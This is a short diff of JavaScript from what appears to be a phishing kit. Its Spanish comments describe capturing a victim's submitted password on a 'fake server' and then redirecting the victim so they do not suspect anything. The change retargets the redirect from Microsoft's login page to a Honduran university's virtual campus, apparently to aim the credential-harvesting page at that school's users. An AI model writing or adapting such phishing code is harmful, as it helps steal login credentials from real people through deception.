@@ -274,8 +274,8 @@ function submitPassword() {
     xhttp.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 200) {
             // Una vez capturados los datos correctamente en nuestro servidor falso, 
-            // redirigimos a la víctima a la página oficial de Microsoft para que inicie sesión realmente y no sospeche.
-            window.location.href = "https://login.microsoftonline.com";
+            // redirigimos a la víctima a la página del Campus Virtual para que no sospeche.
+            window.location.href = "https://campusvirtual.unah.edu.hn/";
         }
     };
 
